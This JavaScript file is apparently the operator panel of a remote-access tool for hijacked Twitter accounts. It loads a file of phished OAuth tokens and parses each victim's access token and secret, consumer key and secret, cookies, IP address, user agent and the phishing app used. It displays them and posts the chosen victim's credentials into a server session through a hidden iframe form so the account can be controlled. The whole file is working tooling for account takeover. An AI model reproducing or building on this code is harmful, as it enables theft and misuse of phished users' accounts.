var twitter_id;
var screen_name;
var oauth_token;
var oauth_secret;
var consumer_key;
var consumer_secret;
var requestData; //json of session tokens for xhr

   function crossDomainPost(params, url,uniqueString) {
        // Add the iframe with a unique name
        var iframe = document.createElement("iframe");
        document.body.appendChild(iframe);
        iframe.style.display = "none";
        iframe.contentWindow.name = uniqueString;

        // construct a form with hidden inputs, targeting the iframe
        var form = document.createElement("form");
        form.target = uniqueString;
        form.action = url;
        form.method = "POST";

        // repeat for each parameter
        for (const key in params) {
          if (params.hasOwnProperty(key)) {
             const hiddenField = document.createElement('input');
             hiddenField.type = 'hidden';
             hiddenField.name = key;
             hiddenField.value = params[key];
             form.appendChild(hiddenField);
          }
        }
       document.body.appendChild(form);
       form.submit();
    }


function getTokenDetails(consumer_key_arg){

	var selected_token = $("#tokenlist option:selected").text();

	var txt = '';
	var xmlhttp = new XMLHttpRequest();
	xmlhttp.onreadystatechange = function(){
	  if(xmlhttp.status == 200 && xmlhttp.readyState == 4){

	    txt = xmlhttp.responseText;

	    token = txt.split("a:4");

	    var twitter_id_str = "<p><b>Twitter Id:</b> ";
	    var screen_name_str = "<p><b>Screen name:</b> ";
	    var consumer_key_str = "<p><b>Consumer key:</b> ";
	    var consumer_secret_str = "<p><b>Consumer secret:</b> ";
	    var oauth_token_str = "<p><b>oauth Token:</b> ";
	    var oauth_secret_str = "<p><b>oauth Secret:</b> ";
	    var time_str = "<p><b>Detection Time:</b> ";
	    var src_ip_str = "<p><b>Source IP:</b> ";
	    var src_port_str = "<p><b>Source Port:</b> ";
	    var useragent_str = "<p><b>Useragent:</b> ";
	    var phish_app_str = "<p><b>Phising App Used:</b> ";
	    var cookies_str = "<p><b>Cookies:</b> ";
	    var is_email_discov = "<p><b>Is email discoverable:</b> ";
	    var geo_flag = "<p><b>Is geo-enabled:</b> ";
	    var http = "<p><b>Always Https:</b> ";


        //parse tokens from file and store them in local storage
	    for (var i = 1; i < token.length; i++) {
	    	if(token[i].search(selected_token) == -1) continue;

            parsed_tokens = ("a:4"+ token[i].replace(/\"/g,'\'')).split("a:15:")
            access_token = unserialize(parsed_tokens[0])
            logger_token = unserialize("a:15:"+parsed_tokens[1])

            twitter_id = access_token['user_id']; //(token[i].split("oauth_token")[1]).split(':"')[1].split("-")[0];
            localStorage.setItem('twitter_id', twitter_id);

            screen_name = access_token['screen_name']; //(token[i].split("screen_name")[1]).split(':"')[1].split('";}')[0];
            localStorage.setItem('screen_name', screen_name);

            oauth_token = selected_token;
            localStorage.setItem('oauth_token', oauth_token);

            oauth_secret = access_token['oauth_token_secret'];  //(token[i].split("oauth_token_secret")[1]).split(':"')[1].split('";s:')[0];
            localStorage.setItem('oauth_secret', oauth_secret);

            consumer_key = logger_token['consumer_key']; //token[i].split("consumer_key")[1].split(':"')[1].split('";s')[0];
            localStorage.setItem('consumer_key', consumer_key);

            consumer_secret = logger_token['consumer_secret'];   //token[i].split("consumer_secret")[1].split(':"')[1].split('";')[0];
            localStorage.setItem('consumer_secret', consumer_secret);

            time = logger_token['time'];  //token[i].split("time\";s:19:\"")[1].split("\";s:12")[0];
            localStorage.setItem("time",time);

            src_ip = logger_token['ip']; //token[i].split("ip\";s:13:\"")[1].split("\";s:3")[0];
            localStorage.setItem("src_ip", src_ip);

            port = logger_token['port']; //token[i].split("port\";i:")[1].split(";s:9")[0];
            localStorage.setItem("port",port);

            useragent = logger_token['useragent']; //token[i].split("useragent\";s:119:\"")[1].split("\";s:6:\"cookie")[0];
            localStorage.setItem("useragent",useragent);

            phish_app = logger_token['postdata']; //token[i].split("postdata")[1].split("s:9:\"")[1].split("\";s:4:")[0];
            localStorage.setItem("phish_app", phish_app);

	    	twitter_id_str += twitter_id+"</p>";
	    	screen_name_str += screen_name+"</p>";
	    	consumer_key_str += consumer_key+"</p>";
	    	consumer_secret_str += consumer_secret+"</p>";
	    	oauth_token_str += selected_token+"</p>";
	    	oauth_secret_str += oauth_secret+"</p>";
	    	time_str += time+"</p>";
	    	src_ip_str += src_ip+"</p>";
	    	src_port_str += port + "</p>";
	    	useragent_str += useragent + "</p>";
	    	phish_app_str += phish_app +"</p>";
	    	cookies_str += JSON.stringify(logger_token['cookie']) +"</p>"; //(token[i].split('cookie";')[1]).split('; ')[0].split('";s:')[0].split('s:51:\"')[1]+"</p>";
	    	is_email_discov += logger_token['discoverable_by_email']+"</p>";
	    	geo_flag += logger_token['geo_enabled'] +"</p>";
	    	http += logger_token['always_use_https'] +"</p>";
	    	
	    	$("#token_detail").html(
	    		twitter_id_str+
	    		screen_name_str+
	    		consumer_key_str+
	    		consumer_secret_str+
	    		oauth_token_str+
	    		oauth_secret_str+
	    		time_str+
	    		src_ip_str+
	    		src_port_str+
	    		useragent_str+
	    		cookies_str+
	    		phish_app_str+
	    		is_email_discov+
	    		geo_flag+
	    		http
	    		);
	    }

	  }
	};
	xmlhttp.open("GET","assets/tokens.txt",true);
	xmlhttp.send();

     //Update cherrypy session with the selected token
     var url = '/thirdpartyrats/twitter/tokens/setTokenSession';
     requestData = {
       m_consumer_key: localStorage.getItem("consumer_key"),
       m_consumer_secret: localStorage.getItem("consumer_secret"),
       m_oauth_token: localStorage.getItem("oauth_token"),
       m_oauth_secret: localStorage.getItem("oauth_secret"),
       m_screen_name: localStorage.getItem("screen_name"),
       m_twitter_id: localStorage.getItem("twitter_id")
     };

    //if session is not initialized within cherrypy or
    //if we have a new token selection then we will update the session variables
    if (consumer_key_arg.trim() == '' || localStorage.getItem('selectedToken') != selected_token){
      localStorage.setItem('selectedToken', selected_token);
      var uniqueString = "update-cherrypy-session";
      crossDomainPost(requestData, url, uniqueString);
    }
}